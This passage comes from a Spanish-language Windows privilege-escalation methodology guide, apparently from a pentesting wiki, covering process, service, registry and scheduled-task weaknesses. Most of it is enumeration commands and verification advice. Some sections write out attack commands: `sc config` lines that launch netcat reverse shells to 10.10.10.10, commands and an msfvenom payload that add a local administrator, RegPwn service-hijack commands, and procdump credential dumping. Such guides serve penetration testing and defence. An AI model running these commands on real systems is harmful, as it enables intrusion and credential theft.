{{#endref}}

### Usuarios conectados / Sesiones

```bash
qwinsta
klist sessions
```

### Carpetas personales

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Política de contraseñas

```bash
net accounts
```

### Obtener el contenido del portapapeles

```bash
powershell -command "Get-Clipboard"
```

## Procesos en ejecución

### Permisos de archivos y carpetas

En primer lugar, al listar los procesos, **comprueba si hay contraseñas en la línea de comandos de alguno de ellos**.\
Comprueba si puedes **sobrescribir algún binario en ejecución** o si tienes permisos de escritura en la carpeta del binario para aprovechar posibles [**ataques de DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Comprueba siempre si hay [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) en ejecución; podrías aprovecharlos para escalar privilegios.

Un debugger listener puede durar poco, así que no encontrarlo en una única captura pasiva de puertos no demuestra que nunca haya estado expuesto. Correlaciona cualquier listener observado con su PID, el propietario del proceso y la capacidad del usuario con menos privilegios para acceder a él; el nombre de una aplicación o una debug flag, por sí solos, no demuestran que sea posible ejecutar código entre usuarios. Mantén la enumeración rutinaria en modo pasivo en lugar de enviar comandos al debugger.

**Comprobación de los permisos de los binarios de los procesos**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Comprobación de los permisos de las carpetas de los binarios de los procesos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Directorios de preprocesadores dinámicos de Snort

Snort 2 puede cargar bibliotecas compartidas desde un `dynamicpreprocessor directory` declarado en la configuración seleccionada con `snort.exe -c <config>`. Para una tarea programada o un servicio que ejecute Snort con otra cuenta, inspecciona esa configuración exacta y las ACL del directorio de módulos declarado. Si tu token puede crear archivos allí, la ruta es candidata a revisión por posible ejecución de código cuando esa tarea o servicio cargue módulos la próxima vez. Verifica los privilegios efectivos de la cuenta de ejecución, la configuración activa, la compatibilidad de los módulos y cualquier restricción de denegación o de recursos compartidos; que un directorio tenga permisos de escritura no demuestra por sí solo una escalada. La [documentación de preprocesadores dinámicos de Snort](https://www.snort.org/documents/dpx-readme) describe la carga de módulos en tiempo de ejecución.

### Servicio web con privilegios elevados y una raíz de documentos con permisos de escritura

En una instalación de Apache en Windows, compara la ruta del ejecutable del servicio y la cuenta con la que se ejecuta con el `DocumentRoot` del `httpd.conf` activo. En una instalación convencional de XAMPP, inspecciona `C:\xampp\apache\conf\httpd.conf` y las ACL de la raíz de documentos configurada, que suele ser `C:\xampp\htdocs`. Si un usuario con menos privilegios puede crear archivos en esa raíz mientras Apache se ejecuta como `LocalSystem`, la ejecución de código del lado del servidor podría cruzar el límite de privilegios del host. Confirma que el servicio esté en ejecución, que se sirva la ruta exacta y que un manejador del lado del servidor procese el tipo de archivo; que una raíz tenga permisos de escritura solo demuestra que se pueden crear archivos. Inspecciona las ACL sin escribir una prueba:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Para una instalación WAMP convencional, el servicio puede apuntar a una ruta versionada `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (o `C:\wamp\...` para una estructura de 32 bits), con la configuración junto a ella, en `conf\httpd.conf`, y una raíz predeterminada `C:\wamp64\www` o `C:\wamp\www`. Comprueba conjuntamente la imagen exacta del servicio, la identidad con la que se ejecuta, el `DocumentRoot` efectivo (incluida la expansión de `${INSTALL_DIR}` y las sustituciones de hosts virtuales) y la ACL de la raíz. Que un directorio WAMP permita escritura no demuestra que Apache se ejecute como `SYSTEM` ni que ejecute el archivo enviado. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Raíz de IIS con permisos de escritura e identidad de red del grupo de aplicaciones

En IIS, vincula un directorio físico con permisos de escritura a un **sitio/aplicación activo** en `applicationHost.config`; luego identifica el grupo configurado y el controlador del lado del servidor. El código colocado en un directorio servido se ejecuta como el grupo solo si IIS procesa ese tipo de archivo y se puede acceder a la ruta. Comprueba el acceso efectivo del usuario actual para crear archivos, el estado de ejecución del sitio, el controlador y las anulaciones por ruta antes de considerar que un directorio con permisos de escritura permite ejecutar código.

La compilación dinámica de ASP.NET introduce una ruta adicional que revisar: los archivos generados en el directorio de compilación de la aplicación. De forma predeterminada, este es un directorio `Temporary ASP.NET Files` dentro de la instalación de .NET Framework correspondiente, pero `<compilation tempDirectory>` de la aplicación puede cambiarlo. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) y [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Si un token con menos privilegios puede modificar el código fuente generado en la caché **específica** de la aplicación, determina si la aplicación lo vuelve a compilar bajo una [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) con más privilegios. Una ACL de archivo o directorio por sí sola no demuestra que se pueda ejecutar código: relaciona la caché con la aplicación activa, el token efectivo y su ACL, la configuración de compilación, la identidad del proceso y el momento de cualquier recompilación. Revisa los metadatos en modo de solo lectura; no provoques la compilación ni alteres archivos de la caché durante la enumeración.

Un grupo de IIS configurado como `ApplicationPoolIdentity` o `NetworkService` suele autenticarse en recursos del dominio como la **cuenta del equipo host**, aunque su token local tenga pocos privilegios. `LocalSystem` ya tiene muchos privilegios localmente y también usa la cuenta del equipo en la red; `LocalService` normalmente presenta credenciales de red anónimas. Un grupo `SpecificUser` utiliza la cuenta que tenga configurada. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) y [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Si se omite la configuración de identidad, se heredan los valores predeterminados del grupo, que varían según la generación de IIS; por tanto, resuelve la configuración efectiva en lugar de inferirla por el nombre del grupo. Si la ejecución de código llega a un grupo con identidad de red de cuenta de equipo, evalúa los permisos de directorio de **ese equipo específico**. [DCSync](../active-directory-methodology/dcsync.md) requiere permisos de replicación en el contexto de nomenclatura del dominio; un ticket de cuenta de máquina o el rol del host por sí solos no los demuestran. La enumeración pasiva debe inspeccionar la configuración y las ACL sin cargar archivos, realizar autenticaciones de red ni solicitar tickets.

Para un controlador ASP.NET legible que inicia un proceso auxiliar, sigue cualquier valor derivado de una solicitud a través de la autenticación, el descifrado, la validación y la construcción del comando. Un controlador que concatena un token decodificado en `ProcessStartInfo("cmd", "/c ...")` puede permitir que los metacaracteres del shell modifiquen el comando; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Confirma que una persona que llama no confiable realmente pueda influir en el valor decodificado y acceder al controlador; después, resuelve la identidad efectiva del grupo de aplicaciones o de la suplantación, así como la identidad del proceso hijo. Una línea de código fuente legible, un listener de localhost o una debilidad en el formato del token, por sí solos, no demuestran la ejecución de comandos con privilegios. Revisa el código fuente y la configuración del grupo sin enviar solicitudes falsificadas ni ejecutar el proceso auxiliar durante la enumeración pasiva.

En un servicio PHP en Windows, una ruta controlada por la solicitud y pasada a [`include` or `require`](https://www.php.net/manual/en/function.include.php) puede evaluar un archivo PHP modificable por un usuario con menos privilegios, bajo la identidad del worker. Confirma que la solicitud pueda llegar a esa instrucción, que la ruta resuelta apunte a un archivo que el usuario con menos privilegios pueda modificar y el worker pueda leer, que las restricciones de ruta PHP aplicables permitan la inclusión y que el worker se ejecute realmente con más privilegios. Un listener de loopback o un archivo con permisos de escritura, por sí solos, no demuestran esta cadena; inspecciona el código fuente, la identidad del servicio y las ACL de los archivos sin invocar el endpoint durante la enumeración pasiva.

### Extracción de contraseñas de la memoria

Puedes crear un volcado de memoria de un proceso en ejecución con **procdump** de sysinternals. Servicios como FTP tienen las **credenciales en texto claro en la memoria**; intenta volcar la memoria y leer las credenciales.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Aplicaciones GUI inseguras

**Las aplicaciones que se ejecutan como SYSTEM pueden permitir que un usuario inicie un CMD o explore directorios.**

Ejemplo: "Windows Help and Support" (Windows + F1), busca "command prompt" y haz clic en "Click to open Command Prompt"

### Importación de archivos de proyecto con privilegios

Una aplicación que abre automáticamente proyectos desde un directorio de entrega en el que puede escribir un usuario de menor privilegio cruza un límite de confianza de entrada bajo la cuenta del importador. Revisa la **ruta exacta en la que se puede escribir**, el proceso o la tarea que la abre, su identidad efectiva y la compilación del parser. Un [problema histórico de Ghidra al abrir o restaurar proyectos](https://github.com/NationalSecurityAgency/ghidra/issues/71) permitía usar entidades externas XML en los metadatos del proyecto; una entidad de red en Windows podía provocar autenticación desde la cuenta del importador si las [políticas de SMB saliente y NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) lo permitían. Esto es un indicio de exposición de credenciales, no acceso inmediato de administrador: la respuesta debe poder aprovecharse a través de una vía independiente autorizada o vulnerable, y las compilaciones actuales deben evaluarse según su estado real de parcheo. No abras un proyecto manipulado durante la enumeración pasiva; inspecciona el flujo de importación y las ACL.

## Servicios

El derecho [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) del objeto Service Control Manager (SCM) es independiente de los derechos sobre un servicio existente. Una solicitud de acceso de solo lectura [`OpenSCManager` satisfactoria](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) para ese derecho es una pista para revisar, no una prueba de que se pueda ejecutar un servicio nuevo. [`CreateService` devuelve un identificador](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) con el acceso al servicio solicitado durante la creación; volver a abrir el servicio más tarde realiza una comprobación de acceso independiente y puede fallar incluso si se podía usar el identificador original. Verifica por separado el token local o remoto efectivo, los derechos concedidos al identificador, la cuenta del servicio, la política de inicio y la ruta del ejecutable. No crees ni inicies un servicio durante la enumeración pasiva.

Para una vía de instalación de servicios remota, relaciona esos derechos de SCM con un recurso compartido del destino en el que pueda escribir el **mismo inicio de sesión de red**, su ACL NTFS subyacente y una ruta local del ejecutable que la cuenta del servicio pueda ejecutar. Una cuenta que no sea de administrador puede cruzar este límite si existen derechos de SCM inusualmente amplios y también la vía para colocar el archivo; no es imprescindible que haya un recurso compartido administrativo. El acceso de escritura al recurso compartido por sí solo, o una pista de permisos para crear servicios en SCM por sí sola, no demuestra que el servicio nuevo pueda iniciarse con una identidad de mayor privilegio.

Un servicio existente puede invocar un ejecutable auxiliar al iniciarse, detenerse o durante otro evento del ciclo de vida, aunque dicho auxiliar no aparezca en su `ImagePath`. Si el nombre del auxiliar se resuelve en un directorio en el que puede escribir un usuario de menor privilegio y el servicio se ejecuta con una identidad de mayor privilegio, la ausencia del archivo auxiliar es una posible vía de sustitución condicionada. Confirma el **código real del servicio o la invocación documentada del auxiliar**, la ruta del ejecutable resuelta y el orden de búsqueda, los permisos para crear directorios, la identidad del servicio y la disponibilidad de un desencadenador del ciclo de vida. Un directorio del servicio en el que se pueda escribir o la ausencia de un archivo, por sí solos, no demuestran que el servicio cargue ese archivo; durante una revisión pasiva, no inicies ni detengas el servicio.

Para un servicio existente, [`SERVICE_START` permite proporcionar argumentos a `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); es distinto de [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Revisa el código del servicio o su interfaz documentada antes de considerar el permiso de inicio algo más que un derecho de control. Si usa un argumento elegido por quien llama como ruta de registro o exportación, verifica la identidad del servicio, el flujo exacto del argumento a la escritura, las restricciones de ruta y los permisos del **archivo creado**. Una escritura en un directorio protegido solo puede convertirse en escalada si existe otro consumidor o cargador con privilegios que acepte ese archivo; un registro en el que se pueda escribir o el permiso de inicio, por sí solos, no bastan. El inventario pasivo no debe iniciar el servicio ni crear un archivo de prueba.

En un agente de monitorización NSClient++, un `nsclient.ini` legible es una **pista para revisar la configuración**: puede contener credenciales web, mientras que `boot.ini` puede redirigir la configuración a otra ubicación. Comprueba la cuenta real del servicio, el listener WEB y la política de acceso, y si el rol autenticado puede cambiar la configuración o los scripts. La ejecución con privilegios requiere además `CheckExternalScripts` (u otra vía de ejecución habilitada), un derecho efectivo para registrar o modificar un comando y un desencadenador que lo ejecute con la identidad del servicio. Un listener limitado a loopback puede seguir siendo accesible para un usuario local, pero la ruta del archivo, la contraseña o el listener, por sí solos, no demuestran que existan esos derechos. Revisa los metadatos y permisos sin mostrar secretos ni invocar la API web durante la enumeración pasiva. Consulta la [estructura de archivos de NSClient++](https://nsclient.org/docs/concepts/file-layout/), las [recomendaciones de seguridad para web y scripts](https://nsclient.org/docs/setup/securing/) y la [configuración de scripts externos](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Para un servicio cuyo `ImagePath` sea `nssm.exe`, inspecciona la cuenta real con la que se ejecuta el servicio y su valor `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM almacena allí la aplicación secundaria](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), mientras que `AppDirectory` es el directorio de trabajo configurado. Comprueba el ejecutable secundario y las ACL de su directorio principal antes de considerar que los permisos del wrapper representan todo el límite de seguridad del servicio. Un endpoint WCF o SOAP local expuesto por esa aplicación secundaria es una pista independiente para revisar: confirma que el usuario de menor privilegio pueda acceder al listener, que la operación exacta acepte su entrada y que la aplicación secundaria del servicio ejecute la operación insegura con una identidad de mayor privilegio. La cuenta del servicio, una URL de endpoint o una ruta en la que se pueda escribir, por sí solas, no prueban una escalada; evita invocar operaciones del servicio durante la enumeración pasiva.

Para una operación WCF personalizada, rastrea una cadena controlada por quien llama hasta cualquier runspace de PowerShell. [`Pipeline.Commands.AddScript` agrega texto de script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) y [`Pipeline.Invoke` ejecuta el pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Un [`netTcpBinding` con credenciales de transporte de Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentica al cliente, pero el permiso para llamar a esa **operación específica** y la identidad efectiva del runspace deben comprobarse por separado. Una ruta desde la entrada de quien llama con menor privilegio hasta `AddScript`, ejecutado con una identidad de servicio de mayor privilegio, constituye un límite de ejecución de código; un puerto en escucha, un cliente autenticado o un método sin uso en un ensamblado no relacionado no son pruebas por sí solos. Revisa estáticamente el servicio implementado, el contrato, la autorización y la configuración de suplantación, sin invocar el endpoint durante la enumeración.

Service Triggers permiten que Windows inicie un servicio cuando se producen ciertas condiciones (actividad en una named pipe o endpoint RPC, eventos ETW, disponibilidad de IP, llegada de un dispositivo, actualización de GPO, etc.). Incluso sin derechos SERVICE_START, a menudo puedes iniciar servicios con privilegios activando sus desencadenadores. Consulta aquí las técnicas de enumeración y activación:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Servicio de recopilación de diagnósticos de Visual Studio

Las instalaciones de Visual Studio con herramientas de C/C++ pueden incluir `VSStandardCollectorService150`, un servicio de diagnóstico configurado para ejecutarse como `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) usó una junction y una condición de carrera con un enlace del object manager para redirigir un restablecimiento de DACL del servicio. La escalada demostrada también requería una vía de reparación MSI utilizable del proveedor WMI de Visual Studio Setup y el destino `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. El componente se corrigió en enero de 2024.

Para la evaluación pasiva, inspecciona la cuenta y la ruta binaria de ese servicio, comprueba si existe la ruta del compilador de Setup WMI y verifica el estado de parcheo del componente instalado. La entrada del servicio, la versión del producto Visual Studio o el archivo del compilador, por sí solos, no demuestran que el host sea vulnerable. La inspección no requiere iniciar el servicio ni ejecutar una reparación.

Obtén una lista de servicios:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permisos

Puedes usar **sc** para obtener información de un servicio.

```bash
sc qc <service_name>
```

Se recomienda tener el binario **accesschk** de _Sysinternals_ para comprobar el nivel de privilegios requerido para cada servicio.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Se recomienda comprobar si "Authenticated Users" puede modificar algún servicio:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Puede descargar accesschk.exe para XP aquí](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar el servicio

Si aparece este error (por ejemplo, con SSDPSRV):

_Error del sistema 1058._\
_El servicio no se puede iniciar porque está deshabilitado o porque no tiene dispositivos habilitados asociados._

Puede habilitarlo usando

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Ten en cuenta que el servicio upnphost depende de SSDPSRV para funcionar (en XP SP1)**

**Otra solución alternativa** a este problema es ejecutar:

```
sc.exe config usosvc start= auto
```

### **Modificar la ruta del binario del servicio**

En el escenario en el que el grupo «Usuarios autenticados» posee **SERVICE_ALL_ACCESS** en un servicio, es posible modificar el binario ejecutable del servicio. Para modificarlo y ejecutarlo con **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Reiniciar servicio

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Los privilegios se pueden escalar mediante varios permisos:

- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar el binario del servicio.
- **WRITE_DAC**: Permite reconfigurar permisos, lo que posibilita cambiar la configuración del servicio.
- **WRITE_OWNER**: Permite adquirir la propiedad y reconfigurar permisos.
- **GENERIC_WRITE**: Hereda la capacidad de cambiar la configuración del servicio.
- **GENERIC_ALL**: También hereda la capacidad de cambiar la configuración del servicio.

Para detectar y explotar esta vulnerabilidad, se puede utilizar _exploit/windows/local/service_permissions_.

### Permisos débiles en los binarios de los servicios

Si un servicio se ejecuta como **`LocalSystem`**, **`LocalService`**, **`NetworkService`** o con una cuenta de dominio privilegiada, pero **los usuarios con pocos privilegios pueden modificar el EXE del servicio o su carpeta principal**, a menudo se puede secuestrar el servicio **reemplazando el binario y reiniciando el servicio**.

**Comprueba si puedes modificar el binario que ejecuta un servicio** o si tienes **permisos de escritura en la carpeta** donde se encuentra el binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puedes obtener todos los binarios que ejecuta un servicio mediante **wmic** (no en system32) y comprobar tus permisos mediante **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

También puedes usar **sc** e **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Busca ACL peligrosas otorgadas a **`Everyone`**, **`BUILTIN\Users`** o **`Authenticated Users`**, especialmente **`(F)`**, **`(M)`** o **`(W)`** en el ejecutable del servicio o en el directorio que lo contiene. Un flujo práctico de explotación es:<sup>[[27]](#references)</sup>

1. Confirma la cuenta del servicio y la ruta del ejecutable con `sc qc <service_name>`.
2. Confirma que se puede escribir en el binario con `icacls <path>`.
3. Sustituye el binario del servicio por un payload o por un binario de servicio malicioso válido.
4. Reinicia el servicio con `sc stop <service_name> && sc start <service_name>` (o espera a que se reinicie el equipo o se active el servicio).

Comprobaciones automatizadas útiles:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Si el servicio no permite que un usuario normal lo reinicie, comprueba si se inicia automáticamente al arrancar, tiene una acción de error que lo vuelve a iniciar o la aplicación que lo usa puede activarlo indirectamente.

### Permisos para modificar el registro de servicios

Debes comprobar si puedes modificar algún registro de servicio.\
Puedes **comprobar** tus **permisos** sobre el **registro** de un servicio haciendo lo siguiente:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Revisa si **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** tienen permisos de escritura en la clave de registro de un servicio específico. Una entrada ACL por sí sola no demuestra que el acceso sea efectivo: importan las entradas de denegación, el token actual y los permisos heredados. Los derechos sobre la clave de registro son independientes de los derechos `SERVICE_CHANGE_CONFIG` y `SERVICE_START` del objeto de servicio. La escalada también requiere un campo de configuración del servicio que se pueda usar, una forma de iniciar el servicio y una identidad de servicio con más privilegios. Consulta los [derechos de las claves del registro](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) y la [referencia de derechos de acceso a servicios](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) de Microsoft.

Para cambiar la ruta del binario que se ejecuta:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Carrera de symlink del registro para escribir un valor arbitrario en HKLM (ATConfig)

Algunas características de Accesibilidad de Windows crean claves **ATConfig** por usuario que luego un proceso **SYSTEM** copia en una clave de sesión de HKLM. Una **carrera de symlink** del registro puede redirigir esa escritura privilegiada a **cualquier ruta de HKLM**, lo que proporciona una primitiva de **escritura arbitraria de valores** en HKLM.<sup>[[18]](#references)</sup>

Ubicaciones clave (ejemplo: Teclado en pantalla `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` enumera las características de accesibilidad instaladas.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` almacena la configuración controlada por el usuario.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` se crea durante el inicio de sesión o las transiciones al escritorio seguro, y el usuario puede escribir en ella.

Flujo de abuso (CVE-2026-24291 / ATConfig):

1. Establece el valor **HKCU ATConfig** que quieres que SYSTEM escriba.
2. Activa la copia al escritorio seguro (por ejemplo, **LockWorkstation**), que inicia el flujo del agente AT.
3. **Gana la carrera** colocando un **oplock** en `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; cuando se active el oplock, reemplaza la clave **HKLM Session ATConfig** por un **enlace del registro** a un destino protegido de HKLM.
4. SYSTEM escribe el valor elegido por el atacante en la ruta redirigida de HKLM.

Una vez que tengas escritura arbitraria de valores en HKLM, pivota a LPE sobrescribiendo valores de configuración de servicios:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/línea de comandos)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Elige un servicio que un usuario normal pueda iniciar (por ejemplo, **`msiserver`**) y actívalo después de la escritura. **Nota:** la implementación pública del exploit **bloquea la estación de trabajo** como parte de la carrera.

Herramientas de ejemplo (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Permisos AppendData/AddSubdirectory del registro de servicios

Si tienes este permiso sobre una clave del registro, significa que **puedes crear subclaves a partir de ella**. En el caso de los servicios de Windows, esto **es suficiente para ejecutar código arbitrario**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Si la ruta a un ejecutable no está entre comillas, Windows intentará ejecutar cada segmento que termine antes de un espacio.

Por ejemplo, para la ruta _C:\Program Files\Some Folder\Service.exe_, Windows intentará ejecutar:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Lista todas las rutas de servicio sin comillas, excluyendo las que pertenecen a servicios integrados de Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Puedes detectar y explotar** esta vulnerabilidad con metasploit: `exploit/windows/local/trusted\_service\_path` Puedes crear manualmente un binario de servicio con metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Acciones de recuperación

Windows permite a los usuarios especificar las acciones que se deben realizar si un servicio falla. Esta función se puede configurar para que apunte a un binario. Si este binario se puede reemplazar, podría ser posible escalar privilegios. Encontrarás más detalles en la [documentación oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Scripts de destino de tareas programadas

En una tarea habilitada que ejecuta `cmd.exe /c` con un archivo `.bat` o `.cmd`, revisa tanto el script indicado en los **argumentos de la acción** como `cmd.exe`. Lo mismo se aplica al argumento de archivo explícito de un intérprete, como PowerShell `-File`. Si un archivo batch programado contiene una llamada literal a PowerShell `-File`, revisa también la ACL del script al que hace referencia; las variables, las condicionales y el encadenamiento de comandos requieren un análisis manual. Un script o directorio principal con permisos de escritura para quien llama solo es un indicio de ejecución entre cuentas cuando el principal configurado para la tarea es distinto de quien llama y la tarea realmente llega a esa acción. Una ACL que permita solo anexar contenido puede ser relevante para los scripts, pero un `exit` anterior u otro flujo de control podría impedir que se ejecuten las líneas añadidas. Confirma las ACL efectivas, el [contexto de ejecución de la tarea](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), el directorio de trabajo, el desencadenador y la política de control de aplicaciones antes de afirmar que es posible escalar privilegios. La enumeración no debe modificar el script ni iniciar la tarea.

## Flujos con nombre en archivos accesibles

En NTFS, un archivo legible puede tener un flujo `:$DATA` con nombre cuyo contenido no aparece en un listado de directorio normal. Para un conjunto pequeño y relevante de archivos de copia de seguridad o configuración accesibles, revisa los **nombres y tamaños** de los flujos antes de abrir cualquier contenido; Windows los expone mediante [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) y PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Un nombre de flujo que sugiera un secreto es solo un indicio. Comprueba el acceso de lectura efectivo al archivo, la compatibilidad del sistema de archivos con los flujos, si el flujo contiene credenciales utilizables y a qué cuenta autentican realmente. Evita los análisis recursivos de flujos y mostrar su contenido durante la enumeración rutinaria.

## Entradas auxiliares del Windows Driver Kit en tareas programadas

